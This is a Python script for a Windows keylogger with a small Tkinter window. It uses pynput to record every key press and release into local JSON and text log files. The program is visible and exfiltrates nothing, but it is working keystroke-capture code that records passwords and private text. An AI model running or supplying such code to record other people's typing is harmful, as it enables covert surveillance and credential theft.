import tkinter as tk
from pynput import keyboard
import json

log_file = "keypress.json"
text_file = "keypress.log"

def on_press(key):
    with open(log_file, "a+") as log_f:
        data = {}
        if isinstance(key, keyboard._win32.KeyCode):
            data["Pressed"] = key.char
        else:
            data["Held"] = str(key)

        json.dump(data, log_f)
        log_f.write("\n")
        with open(text_file, "a+") as text_f:
            text_f.write(str(key) + "\n")

def on_release(key):
    with open(log_file, "a+") as log_f:
        data = {}
        data["Released"] = str(key)
        json.dump(data, log_f)
        log_f.write("\n")

print("[+] Starting keyboard logger...")

def start_logging():
    global listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    print("[+] Logging started.")

def stop_logging():
    listener.stop()
    print("[-] Logging stopped.")

def on_close():
    stop_logging()
    print("[x] Stopping logging...")
    window.destroy()

window = tk.Tk()
window.title("Keyboard Logger")
window.geometry("300x500")
window.configure(bg="#4267B2")
window.protocol("WM_DELETE_WINDOW", on_close)

header_label = tk.Label(window, text="Keyboard Logger", font=("Times New Roman", 24), fg="white", bg="#4267B2")
header_label.pack(pady=20)

start_button = tk.Button(window, text="Start Logging", font=("Times New Roman", 16), bg="#1877F2", fg="white", relief="flat", command=start_logging)
start_button.pack(pady=10)

stop_button = tk.Button(window, text="Stop Logging", font=("Times New Roman", 16), bg="#D93025", fg="white", relief="flat", command=stop_logging)
stop_button.pack(pady=5)

window.mainloop()
